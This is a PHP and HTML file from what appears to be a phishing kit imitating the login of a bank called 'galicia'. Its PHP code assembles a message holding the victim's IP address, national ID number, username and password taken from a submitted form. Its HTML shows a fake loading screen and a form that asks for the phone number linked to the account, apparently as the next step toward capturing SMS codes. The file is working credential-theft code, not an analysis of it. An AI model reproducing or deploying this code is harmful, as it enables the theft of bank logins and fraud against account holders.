<?php  
$enviara =
    "<b> ## galicia iniciar sesión ## </b>\n".
    "<b>Direccion IP: </b> ".$_SERVER['REMOTE_ADDR']."\n".
    
    "<b>DNI: </b> <code>".$_POST['dni']."</code>\n".
    "<b>user: </b> <code>".$_POST['usuartio']."</code>\n".
    "<b>clave: </b> <code>".$_POST['clave']."</code>\n";    
  ...
  <div class="position-fixed cargando bg-white justify-content-center w-100 h-100 align-items-center bg-white" style="display: flex;z-index: 999;">
    <div class="alert border rounded-0 shadow">
      ...
      <div class="text-start">
        ...
        Esto puede tomar <b class="segundos">30</b> segundos
      </div>
    </div>
  </div>
    ...
    <div class="col-sm-12">
      <div class="row m-0">
        ...
        <div class="col-sm-4">
          ...
          <form class="py-3" method="POST" action="ahorael-sms.php">
            <div class="field mb-5 position-relative">
              <input type="tel" maxlength="10" class="custom-lavel-up border-bottom w-100" required name="daleya">
              <label class="position-absolute label-floating-custom">Tu Nro de telefono asociado.</label>
            </div>
